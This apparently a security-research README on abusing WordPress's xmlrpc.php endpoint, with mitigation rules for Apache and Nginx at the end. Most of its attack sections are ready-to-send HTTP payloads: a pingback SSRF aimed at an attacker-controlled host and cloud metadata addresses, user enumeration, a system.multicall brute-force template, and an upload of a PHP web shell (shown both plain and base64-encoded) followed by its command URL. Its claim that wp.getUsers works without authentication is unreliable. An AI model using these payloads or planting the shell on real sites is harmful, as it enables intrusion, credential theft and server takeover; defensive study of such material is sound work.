# XML-RPC PHP File Abuse (xmlrpc.php)

![WordPress](https://img.shields.io/badge/WordPress-Security-blue?logo=wordpress&logoColor=white)
![XML-RPC](https://img.shields.io/badge/XML--RPC-Abuse-red)
![Research](https://img.shields.io/badge/Purpose-Research%20Only-orange)
![Status](https://img.shields.io/badge/Status-Vulnerable-critical)

## 📖 Table of Contents
- [Description](#description)
- [Attack Vectors & Methodologies](#attack-vectors--methodologies)
  - [1. Server-Side Request Forgery (SSRF) via Pingback](#1-server-side-request-forgery-ssrf-via-pingback)
  - [2. User Enumeration & Information Disclosure](#2-user-enumeration--information-disclosure)
  - [3. Authentication Bypass & Bruteforce Amplification](#3-authentication-bypass--bruteforce-amplification)
  - [4. Remote Code Execution (RCE)](#4-remote-code-execution-rce)
- [Mitigation](#mitigation)
- [Conclusion](#conclusion)
- [Disclaimer](#disclaimer)

---

## Description

This repository documents the security implications of having the xmlrpc.php file enabled on a WordPress site. XML-RPC is a legacy protocol that allows for remote procedure calls via XML. While it has legitimate uses (e.g., the WordPress mobile app), its presence opens up several high-impact attack vectors if not properly secured or disabled.

The xmlrpc.php endpoint is often enabled by default and can be exploited to perform attacks ranging from information disclosure to full Remote Code Execution (RCE).

---

## Attack Vectors & Methodologies

### 1. Server-Side Request Forgery (SSRF) via Pingback

The `pingback.ping` method is intended to notify a site when it is linked to. This functionality can be abused to force the server to make HTTP requests to arbitrary internal or external targets, leading to SSRF.

**Proof of Concept (PoC):**
```http
POST /xmlrpc.php HTTP/1.1 
Host: vulnerable-site.com 
Content-Type: application/x-www-form-urlencoded 

<methodCall>
<methodName>pingback.ping</methodName>
<params>
    <param><value><string>http://attacker-controlled.com</string></value></param>
    <param><value><string>https://vulnerable-site.com/?p=1</string></value></param>
</params>
</methodCall>
```

### Impact:

1. Blind SSRF: The server will make a request to the URL supplied in the first parameter.

2. Internal Network Reconnaissance: Can be used to scan internal networks (192.168.1.1, 10.0.0.1) or access cloud metadata services (http://169.254.169.254/).

3. Potential Critical Impact: If the internal infrastructure is vulnerable, this can lead to further compromise.

---

### 2. User Enumeration & Information Disclosure

The wp.getUsers method can sometimes be used to retrieve a list of users, including administrators, without authentication.

**Proof of Concept (PoC):**
```http
POST /xmlrpc.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

<methodCall>
<methodName>wp.getUsers</methodName>
<params>
    <param><value><int>1</int></value></param>
    <param><value><string>invalid_username</string></value></param>
    <param><value><string>invalid_password</string></value></param>
</params>
</methodCall>
```

**Impact:**

1. Information Disclosure: Exposes usernames, user IDs, and roles. This is crucial intelligence for further attacks like password bruteforcing.

2. Attack Chaining: Provides a target list for efficient credential attacks.

---

### 3. Authentication Bypass & Bruteforce Amplification

The system.multicall method allows an attacker to bundle multiple authentication attempts into a single HTTP request, effectively bypassing standard login rate-limiting protections.

Proof of Concept (PoC):
```http
POST /xmlrpc.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

<methodCall>
<methodName>system.multicall</methodName>
<params>
<param>
<value>
<array>
<data>
  <value><struct>
  <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
  <member><name>params</name><value><array><data>
    <value><string>admin</string></value>
    <value><string>password123</string></value>
  </data></array></value></member>
  </struct></value>
  <!-- Repeat this block for thousands of passwords in one request -->
</data>
</array>
</value>
</param>
</params>
</methodCall>
```
**Impact:**

1. Efficient Bruteforce: Thousands of password guesses can be sent in a few requests.

2. Account Takeover: High probability of compromising user accounts, especially those with weak passwords.

3. Privilege Escalation: Compromising an administrator account is a direct path to RCE.

---

### 4. Remote Code Execution (RCE)

If valid administrator credentials are obtained (e.g., via bruteforce), the wp.uploadFile method can be used to upload a malicious PHP shell, leading to full server compromise.

**Proof of Concept (PoC):**

**Craft a base64-encoded PHP shell:**

```php
<?php system($_GET['cmd']); ?>
```
**Use the wp.uploadFile method:**
```http
POST /xmlrpc.php HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
    <param><value><int>1</int></value></param>
    <param><value><string>admin</string></value></param>
    <param><value><string>compromised_password</string></value></param>
    <param><value><struct>
      <member><name>name</name><value><string>shell.php</string></value></member>
      <member><name>type</name><value><string>application/x-php</string></value></member>
      <member><name>bits</name><value><base64>PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</base64></value></member>
      <member><name>overwrite</name><value><boolean>1</boolean></value></member>
    </struct></value></param>
</params>
</methodCall>
```
**Access the shell:**
https://vulnerable-site.com/wp-content/uploads/2024/09/shell.php?cmd=id

**Impact:**

1. Critical - Remote Code Execution: Full control over the web server.

2. Data Breach: Ability to exfiltrate sensitive data, including database credentials.

3. Server Compromise: Can be used as a pivot point to attack other internal systems.

---

### Mitigation

Disable XML-RPC Completely (Recommended): The most effective mitigation is to disable XML-RPC if you do not use it.

**Via .htaccess (Apache):**
```apache
# Block XML-RPC
<Files "xmlrpc.php">
Order Deny,Allow
Deny from all
</Files>
```
**Via nginx.conf (Nginx):**
```nginx
location ~* /xmlrpc.php$ {
    deny all;
    return 403;
}
```
---
### Conclusion

The xmlrpc.php file is a significant security liability. Its functionality, while legitimate, provides attackers with a powerful toolkit to escalate from simple reconnaissance to full system compromise. It is strongly recommended to disable this endpoint unless it is absolutely essential for your site's operation. Regular security assessments and monitoring of authentication logs are also crucial for early detection of abuse.

---

### Disclaimer

This information is for educational and security research purposes only. It is intended to help developers and security professionals secure their systems. Do not test any website without explicit permission. Unauthorized testing is illegal and unethical.

---
